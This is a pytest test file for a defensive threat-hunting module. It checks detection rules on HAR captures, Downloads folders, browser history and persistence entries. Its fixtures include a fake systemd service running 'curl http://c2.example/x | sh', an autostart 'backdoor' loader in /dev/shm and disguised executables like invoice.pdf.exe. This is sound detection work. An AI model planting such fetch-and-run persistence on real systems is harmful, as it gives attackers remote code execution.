"""The hunter's web/download/persistence rules, against fixtures.

HAR captures are untrusted data; these tests pin the caps (oversized and
malformed captures produce zero findings, never a crash) and each attack
pattern the rules name — double extensions, executable downloads, the
MIME wrap, redirect chains, third-party script kits, encoded POSTs, and
raw-IP websockets — plus the Downloads-folder, browser-history, and
startup-automation hunts."""
import json
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from hunter import web  # noqa: E402


def _entry(url="https://example.com/page", mime="", cd="", redirect="",
           method="GET", post="", rtype="", frames=None, pageref="page-1"):
    e = {"request": {"url": url, "method": method},
         "response": {"status": 200, "headers": []},
         "_resourceType": rtype or "Other", "_webSocketMessages": frames}
    if mime:
        e["response"]["content"] = {"mimeType": mime}
    if cd:
        e["response"]["headers"].append(
            {"name": "Content-Disposition", "value": cd})
    if redirect:
        e["response"]["headers"].append(
            {"name": "Location", "value": redirect})
    if post:
        e["request"]["postData"] = {"text": post}
    return e


def _doc(tmp_path, *entries, name="capture.har"):
    """A parsed HAR exactly as the engine receives it — through the file
    and parse_har, the same seam an inbox import crosses."""
    raw = {"log": {"entries": list(entries)}}
    return web.parse_har(_import_file(tmp_path, raw, name))


def _rules(found):
    return [f["rule"] for f in found]


def _import_file(tmp_path, doc, name="capture.har"):
    p = tmp_path / name
    p.write_text(json.dumps(doc))
    return p


def test_normal_session_yields_no_findings(tmp_path):
    doc = _doc(tmp_path, _entry(), _entry(url="https://example.com/style.css",
                                rtype="Stylesheet"))
    assert web.har_findings(doc) == []


def test_oversized_and_malformed_captures_answer_nothing(tmp_path):
    big = tmp_path / "big.har"
    big.write_bytes(b'{"log": {"entries": []}}' + b' ' * (web.HAR_MAX_BYTES + 1))
    assert web.parse_har(big) is None
    bad = tmp_path / "bad.har"
    bad.write_text("{not json at all")
    assert web.parse_har(bad) is None
    empty = tmp_path / "empty.har"
    empty.write_text("[]")
    assert web.parse_har(empty) is None


def test_double_extension_download_is_confirmed_high(tmp_path):
    doc = _doc(tmp_path, _entry(url="https://evil.example/invoice",
                      cd="attachment; filename=invoice.pdf.exe"))
    found = web.har_findings(doc)
    assert "har-double-extension" in _rules(found)
    hit = found[0]
    assert hit["severity"] == "HIGH" and hit["status"] == "confirmed"
    # The finding explains itself without any model involved.
    assert hit["what"] and hit["next"]
    assert "invoice.pdf.exe" in hit["facts"][0]


def test_executable_and_archive_downloads_lead(tmp_path):
    doc = _doc(tmp_path, _entry(url="https://cdn.example/setup.exe",
                      mime="application/octet-stream"),
               _entry(url="https://cdn.example/pack.zip",
                      mime="application/zip"))
    rules = _rules(web.har_findings(doc))
    assert "har-executable-download" in rules
    assert "har-archive-download" in rules


def test_mime_wrap_flagged(tmp_path):
    doc = _doc(tmp_path, _entry(url="https://evil.example/f.htm",
                      cd="attachment; filename=invoice.htm",
                      mime="text/html"))
    assert "har-mime-wrap" in _rules(web.har_findings(doc))


def test_redirect_chain_crossing_domains_into_a_download(tmp_path):
    # page → tracker (redirects) → file host (Content-Disposition).
    doc = _doc(tmp_path, 
        _entry(url="https://mail.example/news",
               redirect="https://track.example/click/9"),
        _entry(url="https://track.example/click/9",
               redirect="https://files2.example/dl"),
        _entry(url="https://files2.example/dl",
               cd="attachment; filename=Faktura.pdf.exe",
               mime="application/octet-stream"))
    found = web.har_findings(doc)
    rules = _rules(found)
    assert "har-redirect-to-download" in rules
    hit = [f for f in found if f["rule"] == "har-redirect-to-download"][0]
    names = hit["facts"][0]
    assert "files2.example" in names and "mail.example" in names


def test_one_site_chain_is_not_flagged(tmp_path):
    doc = _doc(tmp_path, _entry(url="https://shop.example/a",
                      redirect="https://shop.example/b"),
               _entry(url="https://shop.example/b",
                      cd="attachment; filename=guide.pdf",
                      mime="application/pdf"))
    hit = [f for f in web.har_findings(doc)
           if f["rule"] == "har-redirect-to-download"]
    assert hit == []  # one registrable domain: not a phishing-chain shape


def test_third_party_script_kit(tmp_path):
    # Distinct registrable domains, or the approximated eTLD+1 collapses
    # the CDN names into the page's own org and the rule rightly stays quiet.
    doc = _doc(tmp_path, 
        _entry(url="https://shop.example/", rtype="Document"),
        _entry(url="https://ads.example2.com/x.js", rtype="Script"),
        _entry(url="https://tags.example3.net/y.js", rtype="Script"),
        _entry(url="https://files.example2.com/drop.exe",
               cd="attachment; filename=drop.exe",
               mime="application/octet-stream"))
    found = web.har_findings(doc)
    assert "har-third-party-kit" in _rules(found)


def test_base64_post_and_raw_ip_websocket(tmp_path):
    long64 = "A" * 700
    doc = _doc(tmp_path, _entry(url="https://c2.example/up", method="POST",
                      post="p=" + long64),
               _entry(url="https://203.0.113.9/ws",
                      frames=[1, 2, 3, 4]))
    rules = _rules(web.har_findings(doc))
    assert "har-base64-post" in rules
    assert "har-raw-ip-websocket" in rules


def test_registrable_and_raw_ip_helpers():
    assert web.registrable("a.b.co.uk") == "b.co.uk"
    assert web.registrable("cdn.example.com") == "example.com"
    assert web.registrable("203.0.113.9") == "203.0.113.9"
    assert web.is_raw_ip("203.0.113.9")
    assert not web.is_raw_ip("example.com")


def test_downloads_findings_flags_and_verifies(tmp_path, monkeypatch):
    monkeypatch.setattr(web, "_looks_executable", lambda p: False)
    home = tmp_path / "home"
    downloads = home / "Downloads"
    downloads.mkdir(parents=True)
    (downloads / "Faktura.pdf.exe").write_text("MZ pretend")
    (downloads / "setup.msi").write_text("MZ pretend")
    (downloads / "clean.txt").write_text("notes")
    found = web.downloads_findings(str(home))
    rules = _rules(found)
    assert "download-double-extension" in rules
    assert "download-executable" in rules
    double = [f for f in found if f["rule"] == "download-double-extension"][0]
    assert double["status"] == "confirmed"
    assert str(downloads / "Faktura.pdf.exe") in double["facts"][0]
    # Name-only verification stays a lead: file(1) is the verdict, absent
    # here by monkeypatch, and the finding says so.
    exe = [f for f in found if f["rule"] == "download-executable"][0]
    assert exe["status"] == "lead"
    # Files older than the window are out of scope.
    import os
    old = downloads / "OldThing.exe"
    old.write_text("MZ pretend")
    past = web._now_epoch() - (web.DOWNLOADS_WINDOW_DAYS + 2) * 86400
    os.utime(old, (past, past))
    facts = " ".join(f["facts"][0] for f in web.downloads_findings(str(home)))
    assert "OldThing.exe" not in facts


def test_archive_with_disguised_inner_name(tmp_path):
    import zipfile
    home = tmp_path / "home"
    downloads = home / "Downloads"
    downloads.mkdir(parents=True)
    zpath = downloads / "Docs.zip"
    with zipfile.ZipFile(zpath, "w") as z:
        z.writestr("Reports/CV.pdf.exe", "MZ pretend")
    found = web.downloads_findings(str(home))
    hit = [f for f in found if f["rule"] == "download-archive-hazard"]
    assert hit and "CV.pdf.exe" in hit[0]["what"]


def test_file_type_verification_upgrades_the_verdict(tmp_path, monkeypatch):
    """file(1) is the honest check behind the name: when it agrees, the
    download-executable finding is confirmed HIGH instead of a lead."""
    monkeypatch.setattr(web, "_looks_executable", lambda p: True)
    home = tmp_path / "home"
    downloads = home / "Downloads"
    downloads.mkdir(parents=True)
    (downloads / "setup.msi").write_text("MZ pretend")
    exe = [f for f in web.downloads_findings(str(home))
           if f["rule"] == "download-executable"][0]
    assert exe["severity"] == "HIGH" and exe["status"] == "confirmed"


def test_browser_history_downloads_use_a_copy(tmp_path, monkeypatch):
    """The history DB is copied before opening — the live browser file is
    never touched, which the code asserts by construction (copyfile)."""
    home = tmp_path / "home"
    cfg = home / ".config/google-chrome/Default"
    cfg.mkdir(parents=True)
    import sqlite3
    conn = sqlite3.connect(cfg / "History")
    conn.execute("CREATE TABLE downloads (target_path TEXT, tab_url TEXT,"
                 " start_time INTEGER)")
    # Chromium time is microseconds since 1601: ~Oct 2026 epoch-µs value.
    conn.execute("INSERT INTO downloads VALUES (?,?,?)",
                 ("/home/u/Downloads/tool.exe", "https://evil.example/dl",
                  13396700000000000))
    conn.commit()
    conn.close()
    rows = web.history_downloads(str(home))
    assert rows and rows[0]["path"].endswith("tool.exe")
    assert "evil.example" in rows[0]["host"]


def test_persistence_findings_flag_scratch_and_fetchers(tmp_path,
                                                        monkeypatch):
    # The developer's own crontab must not leak into the fixture verdict.
    monkeypatch.setattr(web, "_crontab_lines", lambda: [])
    home = tmp_path / "home"
    (home / ".config/autostart").mkdir(parents=True)
    (home / ".config/autostart/backdoor.desktop").write_text(
        "[Desktop Entry]\nType=Application\n"
        "Exec=/dev/shm/.cache/loader --quiet\n")
    (home / ".config/systemd/user").mkdir(parents=True)
    (home / ".config/systemd/user/net-helper.service").write_text(
        "[Service]\nExecStart=/bin/sh -c 'curl http://c2.example/x | sh'\n")
    found = web.persistence_findings(str(home))
    rules = _rules(found)
    assert rules.count("persistence-scratch-path") == 2
    joined = " ".join(f["what"] for f in found)
    assert "autostart entries" in joined
    assert "user service units" in joined


def test_exec_in_downloads_from_event_telemetry():
    events = [
        {"ts": "2026-11-03T10:00:00Z", "from_tool": "auditd",
         "severity": "INFO",
         "text": "execve /home/u/Downloads/loader.bin started by bash"},
        {"ts": "2026-11-03T10:00:01Z", "from_tool": "clamav",
         "severity": "INFO", "text": "FOUND /home/u/Downloads/loader.bin"},
        {"ts": "2026-11-03T10:00:02Z", "from_tool": "auditd",
         "severity": "INFO", "text": "open /home/u/Downloads/notes.txt read"},
    ]
    found = web.exec_in_downloads(events)
    assert [f["rule"] for f in found] == ["download-executed"]
    assert "loader.bin" in found[0]["what"]